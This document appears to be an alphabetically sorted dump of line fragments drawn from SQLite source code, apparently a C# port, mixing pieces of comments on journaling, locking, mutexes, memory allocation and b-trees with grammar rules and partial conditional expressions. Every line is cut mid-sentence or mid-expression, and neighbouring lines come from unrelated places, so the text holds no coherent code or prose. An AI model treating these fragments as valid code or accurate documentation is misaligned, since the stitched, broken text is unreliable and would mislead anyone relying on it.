 is created for the connection.  This in-memory database will vanish when
 is currently pointing to the largest entry in the sub-tree headed
 is currently pointing to.
 is declared to contain a particular type does not mean that the
 is defined.
 is destroyed by [sqlite3_finalize()] or until the next call to
 is devoted to storing a master journal name - there are no more pages to
 is disabled. The default value for the auto-vacuum property is
 is done.
 is dropped in order to keep the internal representation of the
 is either a NULL pointer or string obtained
 is either a pointer-map page or the pending-byte page. If one
 is enabled.
 is encountered.
 is equal to the number of bytes in the input string <i>including</i>
 is escaped and the SQL generated is as follows:
 is executed.  The test procedures use this information to make sure that
 is filled with pointers to subexpressions.  For example:
 is filled with zeroes.  A zeroblob uses a fixed amount of memory
 is for the xOpen to set the sqlite3_file.pMethods element to NULL.
 is found.
 is fraught with danger.  Best to avoid the whole thing.  If the
 is generated for each row of the table.  TF_HasPrimaryKey is set if
 is generated to remove entries from sqlite_master and/or
 is greater than MAX_SECTOR_SIZE.
 is greater than or equal to the key value. If there are no records
 is greater than the key value. If there are no records greater than
 is happening when it is suppose to.
 is ignored.
 is immediately followed by a TK_LP or TK_USING token.
 is important if the parent page happens to be page 1 of the database
 is in exclusive mode.
 is in pTabList or else it is the NEW or OLD table of a trigger.
 is in register NNN.  See grammar rules associated with the TK_REGISTER
 is included as part of the name.
 is incremented by SQLite whenever the database schema is modified (by
 is initialized to a NULL.
 is initialized to the value passed as the isDirectMode parameter
 is initially attached to the left operand.  But the code generator
 is intended to be private the the where.c module and should not be
 is invoked (if one is specified). If the 
 is invoked before visiting children.)
 is invoked that copies raw records from <table2> over to <table1>.
 is invoked.
 is its destructor.  There are many other interfaces (such as
 is journalling a set of two or more database pages that are stored
 is left pointing at a arbitrary location.
 is left pointing at a random location.
 is less than or equal to the key value. If there are no records
 is less than the key value. If there are no records less than
 is look for a semicolon that is not part of an string or comment.
 is made of any string or blob constant.  See also OP_SCopy.
 is made to open the database for reading and the cycle repeats.
 is made to roll it back. If an error occurs during the rollback
 is made.  That copy is freed when the Vdbe is finalized.  But if the
 is necessary for AUTOVACUUM to work right.  piMoved is set to the
 is needed since any error can use the normal ROLLBACK process to
 is never called in a working implementation.  This implementation
 is never possible.
 is no longer in use.
 is no longer provided.  Only built-in memory allocators can be used.
 is no way that the allocation can extend off the end of the page.
 is not NULL then 
 is not NULL. This variable may only accessed while the STATIC_MASTER
 is not accessed while the backup is running. In practice this means
 is not allowed:
 is not an entry there already.
 is not commuted.
 is not contained in the table.
 is not currently allocated.  SQLite will never do either.
 is not currently entered. If a NULL pointer is passed as an argument
 is not defined.
 is not freed.
 is not invoked when duplication rows are deleted because of an
 is not modified by the update.
 is not possible for another thread to start a new schema change
 is not possible for rc to be other than SQLITE_OK if this branch
 is not safe to call this routine with a [database connection] that
 is not synced. The caller must call sqlite3PagerSync() directly to
 is not the case.
 is obtained from malloc and must be freed by the calling
 is obtained from sqliteMalloc() and must be freed by the calling
 is only able to process joins with 64 or fewer tables.
 is only used by auto-vacuum databases when allocating a new table.
 is only used when wsFlags
 is opaque to the database connection.  The database connection cannot
 is opened on the table with root page BtShared.iTable. Locks are removed
 is out of range or if the wildcard is unnamed.
 is outstanding at one time.  (This is only checked in the
 is outstanding clearing it when the allocation is freed.
 is overwritten without being freed.
 is parsed (i.e. sqlite3AddColumn()) add the new Column data to
 is part of a small set.  Sets are used to implement code like
 is passed in 
 is played back. If one is encountered it is simply skipped.
 is populated with 0xFFFFFFFF when the journal header is written
 is possible to add the page as a new free-list leaf.
 is possible to fail a statement on a database that does not yet exist.
 is possible.
 is provided to turn the [sqlite3_load_extension()] mechanism on and off.
 is really a pointer to an instance of this structure.
 is replaced by a copy of the left-hand side of the result-set expression.
 is required by pragma table_info.
 is required in a few obscure LEFT JOIN cases where control jumps
 is required.
 is reserved for internal use.
 is reset to the value that it held at the start of the savepoint
 is responsible for deallocating that string.  Because the register
 is responsible for making sure sufficient space has been allocated
 is responsible for making sure the node eventually gets freed.
 is returned and the mallocFailed flag cleared.
 is returned by sqlite3PcacheMakeClean() is not called.
 is returned each time a new row of data is ready for processing by the
 is returned if a malloc attempt fails.
 is returned if no matching parameter is found.  The parameter
 is returned if we run out of memory.
 is returned immediately upon encountering the lock. If the busy callback
 is returned the transaction on connection db will still be
 is returned.
 is returned.  Otherwise NULL is returned.
 is returned.  REPLACE means that preexisting database rows that caused
 is returned. In this case the error code and an error message are
 is running then bad things will likely happen.
 is satisfied.
 is selected automatically at compile-time.  The following
 is separate from the database file.  The pager also implements file
 is set high so that we don't have to allocate an unused page except
 is set if the setStatement parameter is true.  A checkpoint should
 is set on.
 is set to CURSOR_VALID.
 is set to SQLITE_NOMEM.
 is set to WO_IN
 is set to the value of the rowid for the row just inserted.
 is set to the value read from the journal header. SQLITE_OK is returned
 is set.
 is significant and used at least once.  On switch statements
 is skipped if the next results would be the same as the previous.
 is something the bestIndex() routine will determine.  This analysis
 is still held on the file. If there is a size limit configured for
 is still writeable 
 is stored in register P2.  If no page
 is substantially reduced.  This is important for embedded applications
 is successfully read from the (sub-)journal file but appears to be
 is swapped with the first free page pulled off the free list.
 is the case.  
 is the maximum space required for an in-memory journal file handle
 is the name of the inner-most trigger or view that is responsible for
 is the number of arguments that the SQL function or
 is the number of free pages currently in the database.  Meta[1]
 is the rowid of a row to delete.  If argv[0] is NULL then no
 is the same as executing Halt.
 is the third argument to sqlite3_busy_handler().  The second argument to
 is the value of the token  
 is the way things are suppose to work.
 is to code both <selectA> and <selectB> with the ORDER BY clause as
 is to limit the maximum cell size so that at least 4 cells will fit
 is to make sure that the schema-version really does change in
 is to say when the EXPLAIN QUERY PLAN syntax is used.)
 is trying to make clean will require a journal sync and the doNotSync
 is unchanged and we can rollback without having to playback the
 is undefined if the mutex is not currently entered by the
 is undefined if the mutex is not currently entered or
 is undefined.
 is unpredictable and not meaningful.
 is usable) and false if it cannot.
 is used as part of the column cache.
 is used but not necessarily so when SQLITE_MUTEX_FAST is used.
 is used but not necessarily so when SQLITE_MUTEX_FAST is used. {END}
 is used during testing and only needs to be supported when SQLITE_TEST
 is used during the reduce.
 is used for testing the I/O recovery logic.
 is used if chngRowid is false and two are used if chngRowid is
 is used internally to track attached databases.
 is used it is merely an optimization.  So it is OK for it to always
 is used.
 is used.  Or if pParse.onError==OE_Default then the onError value
 is working correctly.   This variable has no function other than to
 is.  None of the fields in this object should be used outside of
 isAgg ) )
 isCandidateForInOpt( p ) != 0 )
 isCommit flag passed to sqlite3PagerMovepage 
 isDeferred == 1 )
 isErrorReset )
 isHotJournal != 0 )
 isInit 
 isMainJrnl 
 isMainJrnl is 0 or 1 
 isMallocInit 
 isOpen( pFile ) )
 isOpen( pPager.fd )
 isOpen( pPager.fd ) )
 isOpen( pPager.jfd ) )
 isOpen( pPager.sjfd ) 
 isOpen( pPager.sjfd ) )
 isOpen(pPager.jfd)
 isOuterJoin )
 isPending:
 isReduced )
 isSavepnt is 0 or 1 
 isTemp != 0 
 isTemp != 0 ) iDb = 1
 isTemp ) code = SQLITE_CREATE_TEMP_TRIGGER
 isTemp ){
 isThreadsafe != 0 )
 isThreadsafe == 0 
 isVirtual != 0 )
 isWriteLock
 isWriteLock != 0 ) 
 isWriteLock == 1 )
 isWriteLock==1 )
 issued.
 it allows the operator to set a breakpoint at the spot where database
 it an array of void
 it as a candidate for rollback.
 it can be accessed after all aggregates are computed.
 it can be ignored.
 it can be neglected.
 it can get access to the sqlite3_api_routines structure
 it checks the cookie to make sure the schema has not changed
 it could cause invalid data to be written into the journal.  We need to
 it does not already exist. This is the behavior that is always used for
 it does. The exception is if the statement being parsed was passed
 it increments an undocumented global variable used for testing.
 it into a integer and return that.  If pMem represents an
 it is
 it is a new.
 it is appropriate to apply the LIKE optimization to that function
 it is found in the database file.
 it is initialized.
 it is moved to the free-list and it is also not journalled when it
 it is not considered.
 it is not unlinked from the Table that it indexes.
 it is passed a NULL pointer).
 it is purely advisory. 
 it is quoted using double-quotes.
 it is recommended that applications always invoke sqlite3_initialize()
 it is sometimes activated temporarily while debugging code responsible
 it is that we currently need.
 it is trying to promote to a reserved lock and
 it matches anything so always return true.  Return false only
 it means that instead of one callback with a large array of
 it means this is not a unique index.  Otherwise it is a unique index
 it means we are reading the sqlite_master table because we just
 it might allocate any require mutexes or initialize internal data
 it might be a single loop that uses an index to extract information
 it might be due to the race condition described above and in
 it moves to PAGER_EXCLUSIVE. No locks are downgraded when running in
 it now.
 it out of the ephemeral table before calling VUpdate.
 it overflows an integer.
 it should be truncated. The return value of xGetLastError
 it should just fill it in.  Note that
 it takes up less space.
 it the last character in the list.
 it to be useful for optimising expression pX. Store this
 it to obtain the database schema. At this point the schema may
 it treats the two expressions as literal strings 'abc' and 'def' instead of
 it was.
 it were a hot-journal).
 it will be aligned within the Bitvec struct. 
 it with the new table name.
 it without having to hold the mutex.
 it's important to not reference them for WINCE builds.
 item into the set table with bogus data.
 itemlist 
 itemlist ::= expr 
 itemlist ::= itemlist COMMA expr 
 its Expr.iRightJoinTable value to find the bitmask of the right table
 its initial value is NULL. If the b-tree does not remain constant
 its locks.
 its memory structures.
 its parameters.  Any SQL function implementation should be able to work
 its reference count is not altered by this function.
 its size or internal structure and never deals with the
 itself is not freed.  This routine is the inverse of whereClauseInit().
 iz < zBytes.Length 
 j )
 j -= 2)
 j < 15 
 j < 2 
 j < 3 
 j < ArraySize( aKeyword ) 
 j < ArraySize( db.aFunc.a ) 
 j < BITVEC_NINT 
 j < YY_SZ_ACTTAB 
 j < db.nDb 
 j < i 
 j < k
 j < limit
 j < n 
 j < nArg 
 j < nCol 
 j < nConstraint 
 j < nEq 
 j < nOrderBy 
 j < nRoot 
 j < nTerm 
 j < p.nCol 
 j < p.nLabel )
 j < p.nOp 
 j < pAndWC.nTerm 
 j < pColumn.nId 
 j < pEList.nExpr 
 j < pExpr.pTab.nCol )
 j < pFK.nCol 
 j < pGroupBy.nExpr 
 j < pIdx.nColumn 
 j < pIdx.nColumn )
 j < pKeyInfo.nField 
 j < pLeftTab.nCol 
 j < pList.nId 
 j < pMem.n 
 j < pProbe.nColumn 
 j < pTab.nCol 
 j < pTabList.nSrc 
 j < pWC.nTerm 
 j < zIdent.Length 
 j <= nConstraint 
 j <= vaultItemCount
 j = sqlite3Strlen30( z )
 j == 1 
 j == 2 
 j == 3 
 j == 4 
 j == 5 
 j == 6 )
 j == nCell)
 j > 0 
 j > i 
 j > ins
 j >= 0 
 j >= i
 j >= pColumn.nId )
 j >= pColumn.nId ) )
 j >= pc
 j--) hit[j]
 j--){
 j<4 
 j<i
 j<pIdx.nColumn
 j<pPage.nCell
 j>i
 j>ins
 j] )
 j] = '
 join might be different so we have to recompute the usable flag
 join restriction specified in the ON or USING clause and not a part
 join.  Tickets 
 joinop ::= COMMA
 joinop ::= JOIN_KW JOIN 
 joinop ::= JOIN_KW nm JOIN 
 joinop ::= JOIN_KW nm nm JOIN 
 jointype expresses the join between the table and the previous table.
 journal (a single database transaction).
 journal and ignore it.
 journal before the journal-header. This is required during savepoint
 journal file descriptor is advanced to the next sector boundary before
 journal file in this case.
 journal file is too small for there to be a header stored at this
 journal file must contain sync()ed copies of all of them
 journal file name.
 journal file then all pages up to the first corrupted page are rolled
 journal file to Pager.journalSizeLimit bytes. The journal file does
 journal file unnecessarily.
 journal file) and the PagerSavepoint.pInSavepoint bitvecs of any open
 journal file.
 journal file. There is no need for a bitvec in this case.
 journal header consumes to the journal file here. Then increment the
 journal into the original database file.  Once we transition to
 journal mode.
 journal occurs with just PAGER_RESERVED.  After an sqlite3PagerRollback()
 journal-file may extend past the end of the master-journal name
 journal-header is written to the start of it.
 journal.  The actual file might be larger than this in
 journalStarted
 journalled by PagerCommitPhaseOne() before they are destroyed
 journals have been rolled back.
 jrnlSize > pPager.journalOff
 jump 
 jump if jumpIfNull is SQLITE_JUMPIFNULL or fall through if jumpIfNull
 jump immediately to P2.
 jump to P2.  If the P3 value does not match any entry in P1
 jump to address P2.
 jump:  P2 holds jmp target 
 jumpIfNull == 0 )
 jumps if either operand is NULL 
 just a variation of LIKE) gets called.  This is used for testing
 just have to go ahead and allocate a new page buffer instead of
 just might result in some slightly slower code.  But returning
 just returns 0.  This routine acquires a read-lock the first time it
 just sets the internal state of the pager object so that the
 k != 0 
 k != null 
 k < last 
 k < nConstraint 
 k < pAggInfo.nColumn 
 k < pEList.nExpr 
 k < pIdx.nColumn 
 k < pSrc.nSrc )
 k < pUsing.nId 
 k = k.next )
 k = k.next ) //for ( k = sqliteHashFirst( pDb.pSchema.tblHash ) 
 k = sqliteHashNext( k ) )
 k > 0 
 k=sqliteHashNext(k)){
 k[i] )
 keep entries in the disk file in order so that a scan
 keep the ALWAYS() in case the conditions above change with future
 keeping track of autoincrement keys.
 kept open and either was truncated to 0 bytes or its header was
 key and data without making a copy.  If the key and/or data spills
 key in ascending order.
 key in the original table is pTab.iPKey.)
 key is set to NULL.  CASCADE means that a DELETE or UPDATE of the
 key is true to get the key or false to get data.  The result is written
 key must be a parsed key such as obtained from
 key out of the last column added to the table under construction.
 key that omits the ROWID.  Compare this key value against the index
 key_opt 
 key_opt ::= 
 key_opt ::= KEY expr 
 keys are strings. In the former case a NULL pointer is returned the
 keys with no associated data. If the cursor was opened expecting an
 keys.
 keywords.  Or NULL if those keywords are omitted. iLimit and iOffset
 kind of [sqlite3_value] object can be used with this interface.
 kind of b-tree page (i.e. if when opening the cursor the caller did not
 knowing it.
 label B: 
 label by setting the P2 value to its correct non-zero value.
 larger for some devices.
 larger than 32 bits. 
 larger than a 32-bit integer constant.
 larger than the actual scratch space required due to internal overhead.
 largest index of any column of the table that is actually used.
 largest key on pPage).
 largest root-page number. This guarantees that none of the root-pages
 last insert [rowid].
 last parameter.
 last thing the sqlite3_prepare() function does is copy the error
 lastRowid set by previous OP_NotFound 
 later on.
 later parts of teh Expr object and that extra information might get chopped
 later.
 later.  We might as well just use the original instruction and
 layer (and the SetCookie and ReadCookie opcodes) the number of
 lead to database corruption.
 leafCorrection
 leafCorrection == 4)
 leafCorrection:  4 if pPage is a leaf.  0 if pPage is not a leaf.
 leafCorrection]
 least 13 bytes in size.
 least compile and run.
 least one of the columns in pChanges is being modified.
 least the number of microseconds given.  The xCurrentTime()
 leave an error in pParse.
 leave an error message in pParse.
 leave are not MACROS under C
 leave both nPathname and zPathname set to 0.
 left    
 left holding a NULL.  It is an error for register ranges
 left is p.pPrior.  The left query could also be a compound query
 left pointing at a leaf page which would hold the entry if it
 left unused within the body of a function. This usually happens when
 left-most table in the FROM clause of that same SELECT statement and
 left-most table of the FROM clause 
 left-most term of the select that has a collating sequence.
 len
 len >= nMaster
 lenRowid )
 lenRowid ) )
 length
 length < bufStr.Length 
 length < precision 
 length < width )
 length integer is 1 to 9 bytes where the lower 7 bits of each
 length of a statement and is then updated by OP_SetCounts.  It keeps a
 less than zero [SQLITE_ERROR] is returned and no data is written.
 level of recursion for each term.  A stack overflow can result
 libraries!
 library is built.
 library.
 like the continuation of the number.
 like the following:
 like this:
 likeop ::= LIKE_KW 
 likeop ::= MATCH 
 likeop ::= NOT LIKE_KW 
 likeop ::= NOT MATCH 
 limit and nOffset to the value of the offset (or 0 if there is not
 limit will not be able to rollback the aborted transaction. This could
 limit.
 limitId >= SQLITE_N_LIMIT )
 limit_opt ::= 
 limit_opt ::= LIMIT expr 
 limit_opt ::= LIMIT expr COMMA expr 
 limit_opt ::= LIMIT expr OFFSET expr 
 limits the size of a row in a table or index.
 lines are added to automatically set NDEBUG unless the -DSQLITE_DEBUG=1
 linked list starting at sqlite3.pSavepoint.
 list and does the following:
 list of opcodes] less than 100 is available.
 list without holding the corresponding sqlite3.mutex mutex.
 list.
 literal that does not begin with a wildcard.
 literals may be replaced by a [parameter] in one of these forms:
 load the column indices into the Index structure.  Report an error
 loaded by every new database connection.
 loaded so that the extension can make calls back into the SQLite
 loading and saving of autoincrement information.
 loading is supported.  We need a dummy sqlite3Apis pointer for that
 loading the page into the pager-cache and setting the PgHdr.needSync
 loading.  Otherwise you get the following error.
 loc != 0))
 localtime_s().
 location iTable. The following code modifies the sqlite_master table to
 lock allows other processes to read the database but prohibits
 lock and reacquire the read lock. Purge the cache before
 lock is a write lock if isWritelock is true or a read lock
 lock is already held.
 lock. It does 
 lock. This can be upgraded to an EXCLUSIVE lock by a subsequent call to
 lockBtree() returns something other than SQLITE_OK. lockBtree()
 locked == 0 )
 locked.  (2) we know that the original page content is fully synced
 locking and error handling infrastructure built into the vdbe.
 locking mode.
 locking to prevent two processes from writing the same database
 locking-mode.
 locks and does not require any further unlock-notify callbacks.
 locktype == PAGER_EXCLUSIVE )
 locktype == PAGER_SHARED )
 locktype == SHARED_LOCK )
 logN is a little off.
 longer (since after version 2.8.12) reset to -1.
 longer key.  However if the UNPACKED_INCRKEY flags in pPKey2 is set
 look-ahead token iLookAhead.
 lookaside allocations are not used to construct the schema objects.
 lookaside buffer itself using [sqlite3_malloc()].  The second argument is the
 lookaside malloc provides a significant performance enhancement
 lookaside malloc subsystem.  Each available memory allocation in
 looking for columns of the same name.
 loop below generates code for a single nested loop of the VM
 loop counter 
 loop over all entries of the Btree.  You can also insert new BTree
 loop.
 looping until a free-page located within the first nFin pages
 loops are evaluated and if false a jump is made around all subsequent
 loss of information and return the revised type of the argument.
 lower 30 bits of a 32-bit signed integer.
 lower-case character.
 lowerBits
 lp ::= LP 
 lru page list 
 lwr) / 2)
 machine back to its initial state.
 machine without first calling [sqlite3_reset()] to reset the virtual
 machine.
 machines to be created and run.  It may not be called from within
 macro below).
 macro is used for this purpose.  And instead of referencing the variable
 macro to SQLITE_DEBUG and some older makefiles have not yet made the
 macro.
 macro. 
 macros are constant at compile time the compiler can determine
 macros become no-ops and have zero performance impact.
 macros defined in sqliteInt.h.
 macros to disable tests that are needed in the case of a general
 macros.
 made NULL or made to point to memory obtained from [sqlite3_malloc]
 made to convert the value to an integer or floating point.  If
 magic != SQLITE_MAGIC_BUSY
 main journal or sub-journal as required. If the page is written into
 make a EXPRDUP_REDUCE copy of a reduced expression.  It is only legal
 make it clear to human readers when a function parameter is deliberately
 make it so.
 make no changes to pParse->rc.
 make the file smaller (presumably by auto-vacuum code). Do not write
 make use of it by compiling with -DSQLITE_HAVE_ISNAN.  But we have
 makes the code easier to read during debugging.  None of this happens
 makes the search space 1/3rd smaller.
 making any modifications. Make the page containing the entry to be
 making changes to a page. The caller must check the return value
 malloc error that occurred after the change-counter was updated but
 malloc fails.
 malloc failure occurs while populating it in the for(...) loop below.
 malloc failure when SQLite is invoked recursively by a virtual table
 malloc failures (when the xMalloc() or xRealloc() method of the
 malloc failures happen frequently.  Win32 does not typically run on
 malloc failures. This is only present if SQLITE_OMIT_BUILTIN_TEST
 malloc in allocateIndexInfo() fails and this function returns leaving
 malloc is returned if pnErr is non-zero.  If pnErr==null then NULL is
 malloc subsystem - this implies that the allocation of a static
 malloc() and make pzErrMsg point to that message.
 malloc() for space to hold the result and return the entire results
 malloc().
 malloc.
 management (one of MEM_Dyn or MEM_Static).
 manifest type INTEGER.
 manifest type REAL.
 manipulate entries in the BtShared.pLock linked list used to store
 many as MX_CLOSE_ATTEMPT attempts to close the handle are made before
 many bytes of the key or data as are available on the local
 many have not. The following is a summary:
 map entries are also updated so that the parent page is page pTo.
 map entries for the overflow pages as well.
 mask ) != 0
 mask ) == 0 )
 mask ) >= 0 )
 mask == 0 )
 mask containing EXPRDUP_XXX flags.
 maskSrc ) != 0
 master journal file. If an error occurs at this point close
 master journal pointers within created journal files.
 master-journal filename.
 master-journal.
 match (rc==0).  Change rc to non-zero if a discrepancy
 match than a function where the encoding is different.  
 match that requested.
 match.Value)
 matches the database encoding is a better
 matches the number of vdbe's in the list sqlite3.pVdbe that are
 matches the request for a function with nArg arguments in a system
 matter if it still contains some garbage entries.
 max32BitValue ) 
 maxLocal is the maximum amount of payload to store locally for
 max_page_count macro.
 maximum database size of 2
 maximum depth of the parser stack 
 maximum number of pages in the database file.  The
 maximum page count below the current size of the database.
 maximum rowid counter values recorded while inserting into
 maximum rowid values back into the sqlite_sequence register.
 may add additional static mutexes.  Static mutexes are for internal
 may be NULL.
 may be a temporary index that holds the results of the SELECT
 may be a wrapper capable of caching the first portion of the journal
 may be added in future releases.
 may be incorrectly cleared.
 may be invoked even if the xOpen reported that it failed.  The
 may be lying around. Returning an error code won't help matters.
 may be set or cleared one at a time.
 may cause the parent page to become overfull or underfull. If this
 may choose to reclaim (free or recycle) unpinned pages at any time.
 may contain expression trees of at most
 may contain random values.  Do not make any assumptions about Token.dyn
 may have occurred. The first argument is a pointer to the pager
 may hold a WRITE_LOCK on any table in this file (since there can
 may indicate opportunities for performance improvement through 
 may lead to overlapping statement transactions.
 may mean that the pager was in the error-state when this
 may misinterpret the uninitialised values and delete the
 may not be modified once it is initially set as long as nRef>0.
 may only be invoked prior to library initialization using
 may only be used with [sqlite3_bind_value()] and [sqlite3_result_value()].
 may return SQLITE_NOMEM.
 may return SQLITE_OK but leave pBt.pPage1 set to 0 if after
 may step another VM that opens its own statement transaction. This
 mean that writes of blocks that are nnn bytes in size and
 meaningful if SQLite is compiled with [YYTRACKMAXSTACKDEPTH].</dd>
 means that the SQL statement will never-run - the sqlite3_exec() call
 means that the form of the name is Z and that columns from any table
 means that we always have a look-ahead token. 
 means the close did not happen and needs to be repeated.
 means to continue with the next IN value combination.  When
 means to try really hard to allocate a new page.
 means we have started to be concerned about content and the disk
 mechanisms do not count as direct row changes.
 mem(P3) holds an integer 
 mem0.alarmCallback != null )
 mem0.alarmCallback ){
 mem5.c/mem3.c methods. If neither ENABLE_MEMSYS3 nor
 memcmp(
 memcmp() is used to compare text string.  If both values are
 memory accounting information. The pointer in the first argument must
 memory allcation lookaside optimization.  The first argument is the
 memory allocation fails.
 memory allocation needs. {END}  Additional memory allocator options
 memory allocator that simulates memory out-of-memory conditions in
 memory allocators.
 memory and loops through each of the child journal names. For
 memory as necessary.
 memory cell containing the row data is not overwritten until the
 memory cell in the range.
 memory cell is updated.  The stack is unchanged.
 memory controlled by [SQLITE_CONFIG_PAGECACHE] is not included in
 memory might result in a segmentation fault or other severe error.
 memory needs for the first N pages that it adds to cache.  If additional
 memory obtained from sqlite3_malloc() and to make pzErrMsg point to that
 memory pointer is not NULL and either [SQLITE_ENABLE_MEMSYS3] or
 memory structures of the indices and foreign keys associated with
 memory to hold the resulting string.
 merge loop
 message all text up through the first zero character.
 message is no longer needed.
 message returned through the 5th parameter when it has finished using
 message string from sqlite3_result_error() as UTF-8. SQLite
 met before writing to the database files. (1) the database must be
 meta-data associated with pPg (i.e. data stored in the nExtra bytes
 meta[3] is updated by this procedure.
 meta[BTREE_FILE_FORMAT - 1] >= 4 )
 metadata associated with the SQL value passed as the regular expression
 method becomes the return value of this routine.
 method function.
 method of a [virtual table module].  The fields under 
 method of the default [sqlite3_vfs] object.
 method of the module.  The interpretation of the P4 string is left
 method of the virtual table with the sqlite3_index_info pointer passed
 method of virtual tables.
 method returns a Julian Day Number for the current date and time.
 method returns a bit vector describing behaviors of the
 method.
 middle of identfiers.  But many SQL implementations do.
 might also consider lowering resource limits using [sqlite3_limit()]
 might be available in the  pC.aRow cache.  Or it might not be.
 might be implemented more directly using a hand-written hash table.
 might be moved into the newly deleted root page in order to keep all
 might be possible to form an IN operator with either table1.column
 might be the same as the pArray parameter or it might be a different
 might change the database.
 might move or invalidate the cursor.  Hence cursor pC is always pointing
 might not actually be stored in MemPage.aData[]. This can happen
 might not change and we will need to copy the old value.
 might result if sqlite3_free() is called with a non-NULL pointer that
 might return SQLITE_IOERR
 might return such a mutex in response to SQLITE_MUTEX_FAST.
 minInt is correct here - not maxInt.  It turns out that assigning
 minimum write that can be performed without disturbing
 minus_num ::= MINUS number 
 misuse of the interface such as passing in db pointers that are
 mode has not been set at compile-time or start-time.  If the
 mode.
 mode.  -DSQLITE_DEFAULT_LOCKING_MODE=0 make NORMAL the default locking
 mode.  Doing nothing at all also makes NORMAL the default.
 mode.  Return TRUE if it is and FALSE if not.  Autocommit mode is on
 modification may just have been reverted. If this happens in exclusive
 modifications or enhancements. 
 modified (i.e. sqlite_master and sqlite_sequence).
 modified appropriately.
 modified at any time by a call to the pcache1CacheSize() method.
 modified during normal operations. The other variables in this structure
 modified to the user. This is the only way that a VM that
 modified.
 modify behavior as follows:
 modify the text after they return without harm.
 module or until the [database connection] closes.  The content
 module table).
 more efficient with one encoding than another.  It is allowed to
 more likely to cause a segfault than -1 (of course there are assert()
 more than once within the same index.  Only the first instance of
 more than one blocked connection that has registered for an unlock-notify
 more threads at the same moment in time.
 more times to free up some space before the allocation is performed.
 moreToDo != 0 )
 most frequently used conversion types first.
 most loop)
 most recently added column of the table is the primary key.
 move as a result of the drop (can happen in auto-vacuum mode).
 move the pending byte.
 moved CSE1 up 
 moved CSE2 up 
 moved as part of a database reorganization just before the transaction
 movement was required (because the table being dropped was already
 mrc != SQLITE_INTERRUPT )
 mrc == SQLITE_FULL
 mrc == SQLITE_FULL ) 
 mrc == SQLITE_INTERRUPT 
 mrc == SQLITE_IOERR
 ms ) / 1000 )
 much information about problems as programmers might like.  In an effort to
 much more complex than aggregates without a GROUP BY.
 multiple records into an intkey b-tree using a single cursor (as can
 multiple rows.
 multiselect_op ::= EXCEPT
 multiselect_op ::= UNION 
 multiselect_op ::= UNION ALL 
 must be active for both files.
 must be an open write transaction on the file itself.
 must be called one or more times to evaluate the statement.
 must be complete.  So isInit must not be set until the very end
 must be either NO_LOCK or SHARED_LOCK.
 must be either NULL or else pointers obtained from a prior
 must be exact.  Collating sequences are not used.
 must be held while executing this routine.
 must be started or there must be an open cursor) before
 must be true:
 must be zero-initialized 
 must call sqlite3_enable_load_extension() to turn on extension
 must check the return code and move the results to the desired
 must exist in order to be overloaded.
 must exist or else there must have been an OOM error.  But if there
 must go straight to locking level 0.
 must have been initialized by a prior call to sqlite3FixInit().
 must have been written to the journal file before returning.
 must insure that no other SQLite interfaces are invoked by other
 must invent its own temporary name for the file.  Whenever the 
 must remain unchanged while [sqlite3_exec()] is running.
 must represent a virtual table. This function invokes the xBestIndex()
 must return [SQLITE_OK] on success and some other [error code] upon
 mutex 
 mutex and all required BtShared mutexes.
 mutex and returns a pointer to it.  If it returns NULL
 mutex and returns a pointer to it. {H17012} If it returns NULL
 mutex here. Otherwise the read (and possible write) of db.mallocFailed
 mutex is held.
 mutex must be exited an equal number of times before another thread
 mutex must be held while accessing this list.
 mutex must not require support from the malloc subsystem.
 mutex results in undefined behavior. {H17023} SQLite never deallocates
 mutex routines at start-time using the
 mutex that it allocates.
 mutex to prevent a resource leak.
 mutexes on [database connection] and [prepared statement] objects.
 mutexing on [database connection] and [prepared statement] objects.
 mutual exclusion.
 mxParserStack 
 mxPathname 
 mxStrlen 
 n != P4_VTAB )
 n )
 n - 1 ) == 0 )
 n - 1 <= p.nMem )
 n - 1] == ' ' ) { n--
 n - 1]] 
 n < 3 ) break
 n < nArg 
 n < nVar 
 n < p.nMem 
 n < pIdx.nColumn 
 n < pPager.pageSize )
 n < z.Length 
 n <= 9 )
 n <= nMem 
 n <= p.nMem 
 n <= p.nVar )
 n <= p1 )
 n <= p2 
 n == 0 )
 n == P4_KEYINFO_STATIC )
 n == P4_STATIC )
 n == sqlite3Strlen30( pDb.zName ) 
 n > 0 )
 n > nTemp )
 n >= 0 
 n >= 0x7fffff00 )
 n bytes.
 n containing all zeros.
 n--
 n<=4 )
 n<=db.lookaside.sz
 n<ArraySize(zBuf)-1 
 n==P4_KEYINFO_HANDOFF indicates that zP4 points to a KeyInfo structure
 nAlloc % 8 == 0 
 nAlloc )
 nAlloc - pNew.nCol < 8 )
 nArg 
 nArg == -1 )
 nArg > SQLITE_MAX_FUNCTION_ARG ) 
 nArg parameter is a better match than a function implementation with
 nArg!=0 ){
 nArg==(int)ArraySize(aStatic))
 nBlob 
 nBuf is the amount of space left in buf[].  nBuf must always be
 nByte
 nByte 
 nByte : zInLength
 nByte < z.Length 
 nByte <= iLimit 
 nByte <= pPage.pBt.usableSize)
 nByte <= top)
 nByte <= zInLength ) 
 nByte == top)
 nByte > top)
 nByte is the number of bytes of space needed.
 nByte>0 )
 nBytes != 0)
 nCell
 nCell 
 nCell <= MX_CELL(pPage.pBt) 
 nCell <= pPage.maxLocal)
 nCellKey > 0x7fffffff )
 nCellKey will always be between 0 and 0xffffffff because of the say
 nChar
 nCol
 nCol 
 nCol )
 nColumn != ( pTab.nCol - nHidden ) )
 nColumn != 0 
 nColumn != pColumn.nId )
 nColumn == 0 
 nColumn > 0 )
 nData - (u64)nZero )
 nDestPagesize
 nEq != 0 ) 
 nEq )
 nEq == pProbe.nColumn )
 nEq > 0 ) 
 nEqCol is the number of columns of pIdx that are used as equality
 nErr == 0 
 nExpr
 nExpr 
 nExpr )
 nExtra
 nExtra 
 nExtra > pSrc.nAlloc )
 nExtra >= 3
 nExtraReg )
 nExtra] = pSrc.a[i]
 nField
 nField 
 nField <= p.nMem 
 nField might be significantly less than the true number of columns
 nFin < PENDING_BYTE_PAGE(pBt))
 nFin == PENDING_BYTE_PAGE(pBt))
 nFree > 0)
 nFree<nReq) 
 nFull >= mem0.alarmThreshold )
 nGroupBy )
 nHeap 
 nHr 
 nId
 nId ) < zSql.Length 
 nId] ) 
 nIdx)
 nKey )
 nKey >= 0)
 nKey1 : nKey2
 nKey1 : nKey2 )
 nLeaf 
 nLimit is set to -1 if there is no LIMIT clause.  nOffset is set to 0.
 nLookaside 
 nMaster
 nMaster 
 nMaster < zMaster.Length 
 nMasterPtr 
 nMaxCells
 nMem < 10 )
 nName
 nName 
 nName ) % ArraySize( db.aFunc.a )
 nName ) % ArraySize( pHash.a )
 nNew )
 nNew - nOld >=
 nNumberOfBytesToLockLow == 1){
